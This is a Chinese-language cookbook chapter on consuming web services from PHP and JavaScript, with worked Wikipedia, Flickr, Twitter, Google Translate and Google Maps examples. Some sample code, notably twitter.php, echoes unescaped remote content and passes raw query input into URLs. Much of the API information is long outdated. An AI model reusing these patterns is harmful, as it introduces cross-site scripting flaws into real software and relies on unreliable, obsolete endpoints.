由于使用网络服务公开的 API 应该是平台无关的，因此在客户端和服务器之间的通信中通常使用 XML 和 JSON。服务器公开的一组函数通常使用一种称为 Web 服务描述语言（WSDL）的语言来描述。

**网络服务**是一组可以以多种方式使用的工具。最常见的三种使用方式是 REST、XML-RPC 和 SOAP。

在创建 Web 小部件时，我们可能需要使用各种网络服务标准，让我们浏览一下这些技术。

## SOAP

SOAP，以前定义为**简单对象访问协议**，是访问 Internet 上远程过程的最流行方法之一。它是一种使用 HTTP 和 HTTPS 协议通常从客户端到服务器交换基于 XML 的消息的协议。以 XML 格式公开的 SOAP 过程可以使用 SOAP 协议从客户端使用。

SOAP 是一种基于 XML 的消息传递协议。XML 格式的 SOAP 请求包含以下主要部分：

1.  一个信封，它将文档定义为 SOAP 请求。

1.  一个 Body 元素，其中包含有关过程调用的信息，包括参数和预期响应。

1.  可选头和故障元素，这些元素包含有关 SOAP 请求的补充信息。

SOAP 过程的典型示例是一个网站公开一个名为`addTwoNumbers()`的函数，用于添加两个数字并将响应发送给 SOAP 客户端。由于 SOAP 的请求和响应使用 XML 格式发送，它们是平台无关的，并且可以从远程服务器调用。

SOAP 因其复杂性而受到批评，需要对远程调用进行序列化，然后构造一个 SOAP 信封来包含它。由于这种复杂性，REST 方式正在成为使用网络服务的流行方式。

## REST

REST 代表*表现状态转移*，可能是创建和利用 Web 服务的最流行的方式。这是一种简单而强大的创建和消费 Web 服务的方法。REST 有时被称为**RESTful Web 服务**。RESTful Web 服务使用 HTTP 或类似的协议，通过将接口限制为标准操作（如 GET、POST 和 PUT 方法）来进行交互。REST 侧重于与有状态资源交互，而不是消息或操作。

RESTful Web 服务的两个主要原则是：

+   资源由 URL 表示。资源可以被视为用户可以作为 Web 服务的 API 访问的实体。REST 应用程序中的每个资源都有一个唯一的 URL。

+   RESTful Web 服务中的操作是通过标准的 HTTP 操作进行的，例如 GET、POST 和 PUT。

让我们看一个例子来理解 REST 原则。假设我们有一个市场网站，商家可以上传、查看和删除产品。让我们看一下前面示例的 Web 服务的 RESTful 接口。

+   可以从唯一的 URL 访问每个产品的详细信息。假设它是[`marketplace-website.com/product/123`](http://marketplace-website.com/product/123)，可以使用 HTTP GET 方法从前面的 URL 获取产品的详细信息。

+   可以使用 HTTP POST 方法将新产品发布到网站，服务器在特定 URL 指定的服务器响应中提供有关产品上传的信息。

+   可以使用 HTTP DELETE 方法来删除网站上的特定产品，使用唯一的 URL 进行此操作。

# XML-RPC

XML-远程过程调用是提供和消费 Web 服务的另一种方式。 XML-RPC 使用 XML 来编码服务的请求和响应，使用 HTTP 作为它们的传输介质。

XML-RPC 是一种非常简单的协议，用于使用和消费 Web 服务。它有一套明确定义过程、数据类型和命令的 XML 格式。XML-RPC 旨在尽可能简单。它允许使用其过程传输、处理和返回复杂的数据结构。让我们看一下使用 XML-RPC 调用远程过程的 XML 请求格式，然后看一下服务器以 XML-RPC 格式返回的响应。

```php
<?xml version="1.0"?>
<methodCall>
<methodName>examples.getProductName</methodName>
<params>
<param>
<value><int>10</int></value>
</param>
</params>
</methodCall>

```

如您所见，用于发送请求的 XML 格式非常简单，甚至参数的数据类型也在过程调用中定义。现在，让我们看一下以 XML 格式返回前面调用的响应：

```php
<?xml version="1.0"?>
<methodResponse>
<params>
<param>
<value><string>Apple IPhone 3G</string></value>
</param>
</params>
</methodResponse>

```

正如您所见，XML 响应非常简单易懂。这就是为什么 XML-RPC 也用于许多提供 Web 服务的网站。

# 使用 PHP 创建和消费 Web 服务

PHP 可以用于创建和消费 Web 服务。PHP 具有强大的库，用于创建和消费使用 SOAP 或 XML-RPC 或 REST 的 Web 服务。

让我们尝试通过一个简单的例子来理解如何在 PHP 中消费 Web 服务。在这个例子中，我们将从维基百科的 API 中获取一个短语的详细信息。

## 准备工作

维基百科（[`www.wikipedia.org`](http://www.wikipedia.org)）是一个免费的基于 Web 的多语言百科全书。几乎所有的文章都可以由任何人编辑，如果他们对主题有更多的信息。它可能是人们查找一般知识或特定主题信息的最大和最受欢迎的网站。目前，维基百科有 282 种语言的文章。

## 如何做...

维基百科在[`en.wikipedia.org/w/api.php`](http://en.wikipedia.org/w/api.php)上有一个 API，可用于各种目的，以访问和修改 Wikipedia.org 上的信息。在我们的示例中，我们只是使用维基百科来获取一个术语的解释。

要调用 API 调用，我们需要访问维基百科 API 的以下 URL：

[`en.wikipedia.org/w/api.php?format=xml&action=opensearch&search=PHP&limit=1`](http://en.wikipedia.org/w/api.php?format=xml&action=opensearch&search=PHP&limit=1)

正如你在前面的 URL 中所看到的，API 调用的参数是不言自明的。我们正在访问名为 opensearch 的 API 的操作，搜索关键字是 PHP。我们将结果限制为 1，我们得到的输出格式是 XML。现在，让我们看看前面 API 调用的 XML 输出。

```php
<SearchSuggestion version="2.0"> <Query xml:space="preserve">PHP</Query> <Section> <Item> <Text xml:space="preserve">PHP</Text> <Description xml:space="preserve">PHP is a general-purpose scripting language originally designed for web development to produce dynamic web pages. </Description> <Url xml:space="preserve">http://en.wikipedia.org/wiki/ PHP</Url> </Item> </Section> </SearchSuggestion>

```

正如我们在前面的代码中看到的，我们得到了一个包含关键字 PHP 定义的 XML 结果。

现在，让我们尝试看一个调用 Wickipedia API 的 PHP 代码示例：

```php
$search_keyword = 'facebook';
//we're getting definition of keyword php in xml format with limitation of 1
$api_url = 'http://en.wikipedia.org/w/api.php?format=xml&action=opensearch&search='.$search_keyword.'&limit=1';
//initialling the curl
$ch = curl_init();
// set URL and other appropriate options
curl_setopt($ch, CURLOPT_URL, $api_url);
//to get the curl response as string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //setting the logical user agent
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0");
// grab URL and pass it to the browser
$xml_reponse = curl_exec($ch);
curl_close($ch);
//user simplexml php parser
$xml_obj = simplexml_load_string($xml_reponse);
if($xml_obj->Section->Item->Description)
echo $xml_obj->Section->Item->Description;

```

PHP 调用维基百科 API 的示例

现在，让我们逐行理解前面的代码。代码的前两行是使用搜索关键字初始化变量并形成 API 调用的 URL。现在，让我们试着理解代码的其他行：

```php
$ch = curl_init();

```

前面的行初始化了 CURL 的新会话。CURL 库用于通过互联网传输数据使用各种协议。

要使用 CURL 函数，请确保你的 PHP 编译时支持 CURL 库，否则在尝试执行前面的代码时会出现致命错误。

现在让我们看看其他行：

```php
curl_setopt($ch, CURLOPT_URL, $api_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0");

```

`curl_setopt()`函数用于设置 CURL 执行的不同选项。`CURLOPT_URL`选项用于设置调用的 URL。`CURLOPT_RETURNTRANSFER`设置为 1，这意味着通过执行`curl_exec()`接收到的响应不会直接输出，而是作为字符串返回。此外，`CURLOPT_USERAGENT`用于将调用的用户代理设置为有意义的值。

### 注意

在某些情况下，在进行 API 调用时设置正确的用户代理非常重要；否则 API 服务器可能会拒绝你的调用。

```php
$xml_reponse = curl_exec($ch);
curl_close($ch);
$xml_obj = simplexml_load_string($xml_reponse);
if($xml_obj->Section->Item->Description)
echo $xml_obj->Section->Item->Description;

```

之后，使用`curl_exec()`函数执行 CURL 调用。XML 响应保存在`$xml_reponse`变量中。`$xml_reponse`变量使用 PHP 的**Simplexml**解析器进行解析。如果它是一个有效的响应，那么 XML 节点 Description 存在，这将作为输出通过`echo`语句发送到浏览器的最后一行。

## 它是如何工作的...

执行前面的代码后，你将在浏览器中看到以下输出，这只是你从 API 响应中得到的 Facebook 的描述。

**Facebook（标志性的 facebook）是一个社交网络服务和网站，于 2004 年 2 月推出，由 Facebook，Inc 运营和私人拥有**。

# 使用 Flickr API 与 Ajax

在本节中，我们将使用 Flickr API 从 Flickr.com 检索图像，指定搜索标签是从文本框中输入的。在本节中，我们将看到如何使用 Flickr 提供的 JSONP Web 服务，使用 jQuery 直接在 JavaScript 中获取响应并解析并显示它。在这个例子中，我们不使用 PHP。

## 准备工作

**JSONP**，带填充的 JSON，是 JSON 数据的增强格式，其中 JSON 数据被包装在函数调用中，这允许页面从不同的域访问数据。JSONP 允许我们使用`<script>`元素进行跨域通信。JavaScript 的`XMLHttpRequest`对象，在 Ajax 应用程序中广泛使用，由于现代浏览器的限制，无法进行跨域通信。JSONP 很方便地克服了这种情况。

现在，让我们试着理解 JSONP 是如何工作的。JSONP 只不过是作为函数调用执行的任意 JavaScript 代码。让我们通过一个例子来理解。首先让我们看一个简单的 JSON 数据项：

```php
var item = {'name':'iphone','model':'3GS' };

```

现在，这些数据也可以很容易地作为参数传递给函数，就像下面这样：

```php
itemsDetails({'name':'iphone','model':'3GS' });

```

假设前面的代码是来自名为`example.com`的域的`product.php`的响应；那么前面的代码可以在任何其他域中通过`script`标签的帮助执行。 

```php
<script type="text/javascript"
src="http://example.com/product.php?id=1">
</script>

```

无论哪个页面使用前面的脚本标签，都会执行`itemsDetails({'name':'iphone'，'model':'3GS'})`; 这只是一个函数调用。

因此，总之，JSONP 是填充或前缀 JSON 数据，包装在函数调用中，以实现跨域通信的可能性。

## 操作步骤...

现在，让我们看一下我们的带标签的 Flickr 搜索应用程序是什么样子的：

![操作步骤...](https://github.com/OpenDocCN/freelearn-php-zh/raw/master/docs/php-ajax-cb/img/3081_08_01.jpg)

这只是一个简单的应用程序，您将输入关键字，我们的应用程序将搜索包含该标签的照片并显示它们。我们将使用 Flickr 的公共照片源，网址为[`www.flickr.com/services/feeds/docs/photos_public/`](http://www.flickr.com/services/feeds/docs/photos_public/)。

可以像以下这样调用示例 URL 来查找包含标签 sky 的照片并以 JSON 格式获取 API 响应：

`http://api.flickr.com/services/feeds/photos_public. gne?tags=sky&format=json.`

现在，让我们看一下使用 JSONP web 服务从 Flickr API 搜索标签并显示图像的应用程序的代码。此示例的源代码可以在`example-2.html`文件中找到。

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html >
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Flickr Search HTML</title>
<style type="text/css">
#photos {
margin-top:20px;
}
#photos img {
height:140px;
margin-right:10px;
margin-bottom:10px;
}
</style>
<script type="text/javascript" src="https://Ajax.googleapis.com/Ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript">
$('document').ready(function()
{
$('#photoform').submit(function()
{
//get the value of the search tag
var keyword = $('#keyword').val();
//shows the please wait until result is fetched $("#photos").html('Please wait..');
$.getJSON('http://api.flickr.com/services/feeds/photos_public.gne?tags='+keyword+'&format=json&jsoncallback=?',
function(data)
{
//delete the child elements of #photos
$("#photos").empty();
$.each(data.items, function(index,item){
//now append each image to #photos
$("#photos").append('<img src="'+item.media.m+'" />');
});
} );
//to protect from reloading the page
return false;
});
});
</script>
</head>
<body>
<form method="post" name="photoform" id="photoform">
Keyword : <input type="text" name="keyword" id="keyword" value="" /> <input name="findphoto" id="findphoto" value="Find" type="submit" />
</form>
<div id="photos"></div>
</body>
</html>

```

## 工作原理...

您可能已经仔细查看了前面的代码。即便如此，让我们尝试理解前面代码的主要部分。

```php
<style type="text/css">
#photos {
margin-top:20px;
}
#photos img {
height:140px;
margin-right:10px;
margin-bottom:10px;
}
</style>

```

在这里，我们只是为元素定义 CSS 样式。第一个声明中，`#photos`设置元素的顶部边距为 20 像素。另一个 CSS 声明，`#photos img`应用于`#photos`元素内的所有`<img>`元素。在第二个声明中，我们将图像元素的高度设置为 140 像素，并在右侧和底部设置 10 像素的边距。

应用程序的 jQuery 库托管在 Google 上。我们可以直接在应用程序中使用它以节省带宽。

```php
<script type="text/javascript" src="https://Ajax.googleapis.com/Ajax/libs/jquery/1.4.2/jquery.min.js"></script>

```

我们在这里使用的是 jQuery 1.4.2 版本。现在，让我们看一下处理表单提交并搜索标签的照片的实际 jQuery 函数。

```php
$('#photoform').submit(function()
{
var keyword = $('#keyword').val();
$("#photos").html('Please wait..');

```

在这里，我们将事件处理程序附加到 ID 为**photoform**的表单的提交事件上。每当表单提交时，都会调用此函数。第一行将文本框的值（ID 为 keyword）存储到名为`keyword`的 JavaScript 变量中。接下来的行在照片容器元素中显示**请等待。**的消息。

```php
$.getJSON('http://api.flickr.com/services/feeds/photos_public.gne?tags='+keyword+'&format=json&jsoncallback=?',
function(data)
{

```

现在，在此之后，我们使用 jQuery 强大的`getJSON`函数从远程域获取 JSONP 数据。请记住，回调函数中的变量`data`保存了从 JSONP API 调用返回的 JSON 数据。

### 注意

在前面的 API 调用中，我们指定了`jsoncallback`参数，设置为`?`。这意味着 jQuery 会自动用正确的方法名替换`?`，自动调用我们指定的回调函数。

```php
$("#photos").empty();

```

前面的代码删除了照片容器的子节点元素，即`#photo`。在查看如何使用 jQuery 解析和显示 JSON 数据之前，让我们先看一下 Flickr 源发送的示例 JSON 响应。

```php
jsonp3434324344({
"title": "Recent Uploads tagged sky",
"link": "http://www.flickr.com/photos/tags/sky/",
"description": "",
"modified": "2011-04-17T17:30:30Z",
"generator": "http://www.flickr.com/",
"items": [
{
"title": "I needed to believe in something",
"link": "http://www.flickr.com/photos/mmcfotografia/5628290816/",
"media": {"m":"http://farm6.static.flickr.com/5064/5628290816_dc91b37539_m.jpg"},
"date_taken": "2011-04-17T14:26:33-08:00",

```

在查看了前面的响应格式之后，现在让我们看看如何解析前面的 JSON 响应。

```php
$.each(data.items, function(index,item){
$("#photos").append('<img src="'+item.media.m+'" />');
});

```

如您所知，`data`是一个保存 JSON 数据的变量。`data.items`数组保存了响应的各个项目。使用 jQuery 的`each()`函数循环遍历这些数据。`each()`函数的回调函数接受两个参数；第一个是索引，第二个是值本身。如您在上面的 JSON 响应格式中所见，可以使用`item.media.m`变量从循环中访问 Flickr 的图像 URL。使用 jQuery 的`append()`函数将图像附加到照片容器元素。

在`submit()`函数的回调结束处有一个`return false`;语句，以防止表单提交，导致页面重新加载。

```php
return false;

```

## 还有更多...

除了 JSON 之外，Flickr 还提供许多不同格式的源，如 RSS、Atom、SQL、YAML 等。您可以根据应用程序的需要使用这些源的格式。

如果您需要 Flickr API 的更多功能，比如上传照片、获取朋友的照片等，那么您可以在[`www.flickr.com/services/api/`](http://www.flickr.com/services/api/)上详细了解 Flickr 的 API。

# 使用 Ajax 调用 Twitter API

在本节中，我们将看到如何使用 PHP 和 Ajax 创建一个工具，该工具使用 Twitter 搜索 API 从用户那里检索包含搜索关键字的推文。我们将使用 Ajax、PHP 和 Twitter API 来制作这个工具。

## 准备就绪

您可以按以下方式调用 Twitter 搜索 API：

[`search.twitter.com/search.format?q=your_query_string`](http://search.twitter.com/search.format?q=your_query_string)

在前面的调用中，`format`可以替换为`json`或`atom`。此外，我们可以使用额外的`callback`参数进行 JSONP 调用。

[`search.twitter.com/search.format?q=your_query_string&callback=?`](http://search.twitter.com/search.format?q=your_query_string&callback=?)

假设我们想要搜索包含**php**的推文，并以 JSON 格式获取响应；那么我们可以这样调用 Twitter API：

[`search.twitter.com/search.json?q=php`](http://search.twitter.com/search.json?q=php)

## 如何做...

在这里，您可以看到 Twitter 搜索应用程序的接口，使用 Ajax。这是一个非常简单的界面，只有最少的 CSS。有一个文本框，用户输入搜索关键字并点击“搜索”按钮。这个搜索关键字通过 Ajax 传递给 PHP 脚本，PHP 脚本通过调用 Twitter API 获取结果。

![如何做...](https://github.com/OpenDocCN/freelearn-php-zh/raw/master/docs/php-ajax-cb/img/3081_08_02.jpg)

现在，让我们看一下这个应用程序的代码。与此示例相关联的有两个文件。一个文件是`example-3.html`，其中包含用于前端操作的 JavaScript、CSS 和 HTML 代码。另一个是`twitter.php`文件，通过 Ajax 调用以从 Twitter 获取结果。

首先，让我们看一下`example-3.html`的代码：

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html >
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Search Twitter using their API </title>
<style type="text/css">
body{
font-family:Arial, Helvetica, sans-serif;
}
#tweets {
margin-top:20px;
}
#tweets ul {
margin:0px; padding:0px;
}
#tweets li {
border-bottom:1px solid #B4B4B4;
background-repeat:no-repeat;
font-size:17px;
min-height:30px;
padding-left:75px;
list-style:none;
margin-bottom:10px;
}
#tweets li a {
color:#900;
text-decoration:none;
}
#tweets li a:hover {
color:#06C;
}
</style>
<script type="text/javascript" src="https://Ajax.googleapis.com/Ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript">
$('document').ready(function()
{
$('#tweetform').submit(function()
{
//get the value of the search keyword
var keyword = $('#keyword').val();
//shows the please wait until result is fetched
$("#tweets").html('Please wait while tweets are loading....');
$.Ajax({
url : 'twitter.php',
data : 'query='+keyword,
success : function(html_data)
{
$('#tweets').html(html_data);
}
});
//to protect from reloading the page
return false;
});
});
</script>
</head>
<body>
<h2>Twitter Search Demo using Ajax</h2>
<form method="post" name="tweetform" id="tweetform">
Keyword : <input type="text" name="keyword" id="keyword" value="" /> <input name="findtweet" value="Search" type="submit" />
</form>
<div id="tweets"></div>
</body>
</html>

```

正如我们在前面的代码中看到的，有一个 Ajax 调用`twitter.php`文件。让我们看一下`twitter.php`文件的代码：

```php
<?php
//get the JSON response of serach keyword using search api of twitter
$raw_data=file_get_contents("http://search.twitter.com/search.json?q=".$_GET['query']);
//decode the json data to object
$tweets=json_decode($raw_data);
echo '<ul>';
if(count($tweets->results)>0)
{
foreach($tweets->results as $tweet)
{
echo "<li style='background-image:url(".$tweet->profile_image_url.");'>";
echo "<a href='http://twitter.com/".$tweet->from_user."'>".$tweet->from_user."</a> : ";
echo $tweet->text;
echo "</li>";
}
}
else
{
echo "<li> Sorry no tweets found </li>";
}
echo '</ul>';
?>

```

## 它是如何工作的...

在查看代码及其界面之后，现在让我们详细了解它是如何工作的。

首先，让我们看一下`example-1.html`文件。它在顶部有 CSS 样式，我们不需要太多解释。

此外，HTML 代码也是不言自明的；我认为你不会在尝试理解它时遇到太多困难。

让我们跳转到 jQuery 代码并理解它：

```php
var keyword = $('#keyword').val(); $("#tweets").html('Please wait while tweets are loading....');

```

在这里，我们将 ID 为`keyword`的文本框的值分配给名为`keyword`的 JavaScript 变量。之后，我们将信息性消息放到 ID 为`tweets`的元素中，以显示它，直到从 Ajax 接收到响应为止。

```php
$.Ajax({
url : 'twitter.php',
data : 'query='+keyword,
success : function(html_data)
{
$('#tweets').html(html_data);
}
});

```

现在，在前面的代码中，我们使用了 jQuery 的 Ajax 函数调用，并传递了一个参数查询，该参数具有文本框中输入的值。一旦 Ajax 请求完成，成功的响应将插入到#tweets 中。

### 注意

如果在 jQuery 的 Ajax 函数中未指定请求类型，则默认请求类型将为 GET。

正如我们在前面的代码中看到的，有一个 Ajax 调用`twitter.php`。现在，让我们看一下`twitter.php`脚本的代码：

```php
$raw_data=file_get_contents("http://search.twitter.com/search.json?q=".$_GET['query']); $tweets=json_decode($raw_data);

```

这前两行是代码的关键部分。在第一行中，我们使用 PHP 的`file_get_contents()`函数从 Twitter 获取搜索结果的内容。然后将响应存储在`$raw_data`变量中。在第二行中，使用`json_decode()`函数将 JSON 数据转换为 PHP 变量。

在查看剩余部分之前，让我们看一下我们从 Twitter API 获得的 JSON 响应，使用搜索 API 调用：

```php
{
"results": [{
"from_user_id_str": "83723708",
"profile_image_url": "http://a2.twimg.com/profile_images/814809939/n100000486346445_3870_normal.jpg",
"created_at": "Tue, 19 Apr 2011 09:10:30 +0000",
"from_user": "cdAlcoyano",
"id_str": "60269025921466369",
"metadata": {
"result_type": "recent"
},
"to_user_id": null,
"text": "Torneo en Novelda del Futbol Base: http://bit.ly/eNzvfy",
"id": 60269025921466369,
"from_user_id": 83723708,
"geo": null,
"iso_language_code": "no",
"to_user_id_str": null,
"source": "&lt;a href=&quot;http://twitterfeed.com&quot; rel=&quot;nofollow&quot;&gt;twitterfeed&lt;/a&gt;"
}, {
"from_user_id_str": "125327460",

```

正如您在前面的代码片段中看到的，来自 Twitter 的示例 JSON 响应，响应以数组形式在 results 变量中可用。现在，让我们看一下用于解析前面响应的 PHP 代码。

```php
if(count($tweets->results)>0)
{
foreach($tweets->results as $tweet)
{
echo "<li style='background-image:url(".$tweet->profile_image_url.");'>";
echo "<a href='http://twitter.com/".$tweet->from_user."'>".$tweet->from_user."</a> : ";
echo $tweet->text;
echo "</li>";
}
}

```

正如您在前面的代码中所看到的，首先我们计算返回的 JSON 数据中的推文数量。如果结果大于零，则我们解析每条推文并在`li`元素上显示它们。

# 使用 Google Ajax API 翻译文本

在本节中，我们将看一下 Google Ajax API，将文本从一种语言翻译成其他语言。Google 为一系列操作提供了 Ajax API，例如 Google 地图、语言翻译、图表等。在本部分中，我们将看一下如何使用 Google 翻译 Ajax API 将文本从一种语言翻译成另一种语言。

## 准备工作

要使用 Google Ajax API，我们首先需要为您的特定域名注册密钥。您可以从以下 URL 获取 Google Ajax API 的 API 密钥：[`code.google.com/apis/loader/signup.html`](http://code.google.com/apis/loader/signup.html)。获得 API 密钥后，您可以使用以下 URL 插入 Google API：

```php
<script type="text/javascript" src="https://www.google.com/jsapi?key=YOUR-API-KEY"></script>

```

现在，在调用 URL 之后，我们可以为应用程序加载特定的模块。假设我们要使用 Ajax 语言 API；那么我们可以这样加载它：

```php
google.load("language", "1");

```

第一个参数是您想要在页面上使用的模块。在这里，我们使用的是语言模块。第二个参数是特定模块的版本，在前面的示例中是 1。

### 注意

`load()`函数中还有第三个参数，即`packages`。这是可选的，可以根据需要使用。例如，要加载带有 corechart 包的 Google 可视化模块，我们使用以下代码：`google.load('visualization', '1', {'packages':['corechart']})`；

## 如何做...

首先，让我们来看一下我们使用 Google 翻译 API 构建的语言翻译工具的界面。

![如何做...](https://github.com/OpenDocCN/freelearn-php-zh/raw/master/docs/php-ajax-cb/img/3081_08_03.jpg)

正如您在上一个屏幕截图中所看到的，界面简单而简洁。有一个文本区域，您可以在其中输入要翻译的文本。在下面，有一个下拉选择框，您可以选择要将前面的文本翻译成的语言。在这个应用程序中，我们只在下拉菜单中添加了 5 种流行的语言。

Google 支持更多的语言在翻译 API 中。Google 不断添加更多的语言支持，因此对于最新的语言支持，请查看支持的最新语言列表的 URL：[`code.google.com/apis/language/translate/v1/getting_started.html#translatableLanguages`](http://code.google.com/apis/language/translate/v1/getting_started.html#translatableLanguages)。

在查看了这个工具的界面之后，现在让我们来看一下它的代码，探索它是如何实际工作的。

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html >
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<title>Language translation using Google Ajax language API</title>
<style title="text/css">
#label , #translate{
margin-top:10px;
}
#tanslated_text{
font-weight:bold;
margin-top:20px;
}
</style>
<script src="https://www.google.com/jsapi?key=YOUR-API-KEY"></script>
<script type="text/javascript">
google.load("language", "1");
//translate function
function translate_text()
{
var text = document.getElementById('content').value;
var lang = document.getElementById('languages').value;
//check for the empty text
if(text=='')
{
alert('Please enter some text to translate');
return false;
}
//for showing informative message
document.getElementById("tanslated_text").innerHTML = 'Translating...';
//call the translate function, empty second argument = detect language automatically
google.language.translate(text, '', lang, function(result) {
if (result.translation)
{
document.getElementById("tanslated_text").innerHTML = result.translation;
}
});
//to avoid submitting the form manually
return false;
}
</script>
</head>
<body>
<h3>Language translation using Google Ajax language API</h3>
<form method="post" name="translationform" id="translationform" onsubmit="return translate_text();">
<label for="content">Translation Text : </label>
<br />
<textarea name="content" id="content"></textarea>
<br />
<label for=" languages ">To Language : </label>
<br />
<select name="languages" id="languages">
<option value="es">Spanish</option>
<option value="fr">French</option>
<option value="zh">Chinese</option>
<option value="de">German</option>
<option value="en">English</option>
</select>
<br />
<input name="translate" id="translate" value="Translate" type="submit" />
</form>
<div id="tanslated_text"></div>
</body>
</html>

```

## 它是如何工作的...

在查看了代码之后，让我们来看一下代码的主要部分的详细信息，看看它是如何工作的。

首先，让我们来看一下 JavaScript API 是如何加载的：

```php
<script src="https://www.google.com/jsapi?key=YOUR-API-KEY"></script>
<script type="text/javascript">
google.load("language", "1");

```

我们使用我们的 API 密钥调用 Google 的 JavaScript API。之后，在代码的下一行，我们加载了 Google API 的语言模块。

现在，让我们来看一下表单的定义：

```php
<form method="post" name="translationform" id="translationform" onsubmit="return translate_text();">

```

正如您在前面所看到的，我们在表单的提交操作上调用了`translate_text()`函数。还要记住`onsubmit`事件需要一个返回类型。如果返回类型是`true`，则表单被提交，否则提交事件不会被触发。

现在，让我们来看一下 JavaScript 的`translate_text()`函数。

```php
var text = document.getElementById('content').value; var lang = document.getElementById('languages').value; if(text=='')
{
alert('Please enter some text to translate');
return false;
}

```

在前面的列表的前两行中，我们为变量`text`和`lang`分配了值，它们保存了要翻译的内容和需要将该内容翻译成的语言。

然后，在列表的接下来的 4 行中，我们只是验证`text`变量是否为空。如果要翻译的内容为空，则返回`false`给调用函数。

### 提示

用户可以简单地在文本框中输入空格以绕过前面的验证。JavaScript 没有像 PHP 那样内置的`trim()`函数。您可以编写自己的函数，或者如果您已经在应用程序中使用了 JavaScript 库，如 jQuery，这些库通常提供`trim()`函数。

现在，让我们看一下谷歌翻译 API 代码的主要部分：

```php
google.language.translate(text, '', lang, function(result) {
if (result.translation)
{
document.getElementById("tanslated_text").innerHTML = result.translation;
}
});

```

如前面的代码中所示，API 具有带有 4 个参数的`translate()`函数。让我们逐个来看：

+   文本 - 此参数包含需要翻译的文本或内容。

+   源语言 - 此参数是提供的文本或内容的源语言。如前面的清单中所示，它是空白的。如果为空白，我们要求函数自动检测源语言。

+   目标语言 - 此参数是需要翻译的文本的目标语言。在我们的情况下，此变量是从下拉菜单中选择的语言的值。

+   回调函数 - 第四个参数是接收翻译结果的回调函数。

在回调函数中，我们首先检查翻译结果是否为空。如果不为空，我们将在 ID 为`translated_text`的`<div>`元素上显示翻译后的文本。

# 使用谷歌地图

谷歌地图可能是网络上最受欢迎的地图服务，是谷歌免费提供的地图应用程序。谷歌地图包含强大的 API，通过使用这些 API，不同的第三方网站可以用于各种目的，如路线规划、查找驾驶路线和距离等。

谷歌地图正在变得越来越强大和有用，因为它被许多基于评论的服务应用程序和许多流行的移动应用程序广泛使用。

在本节中，我们将学习如何将谷歌地图嵌入到网页中。

## 准备就绪

可以使用简单的`<Iframe>`代码将谷歌地图嵌入网站，该代码基本上用于显示特定位置的地图或突出显示该位置的地标。它不能用于谷歌地图 API 交互。

准备就绪

如前面的图像所示，您可以通过单击**链接**选项卡从谷歌地图中获取特定位置的 Iframe 代码。

## 如何做...

但我们更感兴趣的是使用谷歌地图的 JavaScript API，而不是使用`<iframe>`。因此，让我们看一个在网页中使用 JavaScript API 使用谷歌地图的示例。

### 注意

在本书中，我们使用的是谷歌地图 JavaScript API 版本 3.0。其他版本的谷歌地图 API 的代码可能有所不同。此外，版本 3 不需要 API 密钥来调用谷歌地图 API。

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<style type="text/css">
body { height: 100%; margin: 0px; padding: 0px }
#map { width:500px; height:500px; }
</style>
<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false"> </script>
<script type="text/javascript">
function showmap() {
//longitude and latitude of Kathmandu, Nepal
var lat_lng = new google.maps.LatLng(27.702871,85.318244);
//options of map
var map_options = {
center: lat_lng,
zoom : 18, //zoom level of the page
mapTypeId: google.maps.MapTypeId.SATELLITE
};
//now map should be there
var map = new google.maps.Map(document.getElementById("map"), map_options);
}
</script>
</head>
<body onload="showmap()">
<div id="map" ></div>
</body>
</html>

```

现在，让我们详细了解前面的代码。

```php
<body onload="showmap()"> <div id="map" ></div>

```

这是地图显示的容器。您可以在 CSS 样式中看到，该容器定义为宽度为 500 像素，高度为 500 像素。您还可以看到在`onload()`事件上完全加载页面时调用`showmap()`函数。

现在，可以通过在网页中包含以下 URL 的 JavaScript 文件来使用谷歌地图 JavaScript API。

```php
<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false"></script>

```

您可以看到`sensor`参数被指定为`false`。您必须明确指定此参数。此参数指定我们的基于地图的应用程序是否使用传感器来确定用户的位置。

### 注意

传感器通常在诸如广泛用于手机的 GPS 定位器之类的应用程序上设置为`true`。

现在让我们来看一下`showmap()`函数的代码：

```php
var lat_lng = new google.maps.LatLng(27.702871,85.318244);

```

在第一行，我们创建了`latLng`类的`Lat_lng`对象，并向构造函数传递了两个参数。第一个参数是纬度，第二个参数是经度。上面示例中给出的纬度和经度值是尼泊尔加德满都的。

```php
var map_options = {
center: lat_lng,
zoom : 18, //zoom level of the page
mapTypeId: google.maps.MapTypeId.SATELLITE
};

```

在另一行中，我们创建了`map_options`对象来设置地图的不同选项。地图的中心由`lat_lng`对象指定。地图的缩放级别设置为 18。第三个设置是`mapTypeId`，设置为`google.maps.MapTypeId.SATELLITE`以获取卫星地图。除此之外，还支持其他三种地图类型：

+   `google.maps.MapTypeId.ROADMAP` 这是您在 Google 地图上看到的默认 2D 瓦片。

+   `google.maps.MapTypeId.HYBRID` 这是一种带有显示显著地标的卫星地图。

+   `google.maps.MapTypeId.TERRAIN` 这种类型用于显示基于地形信息的物理地图。

最后，使用基本的`google.maps.Map`对象，我们将在指定的容器中显示地图。

```php
var map = new google.maps.Map(document.getElementById("map"), map_options);

```

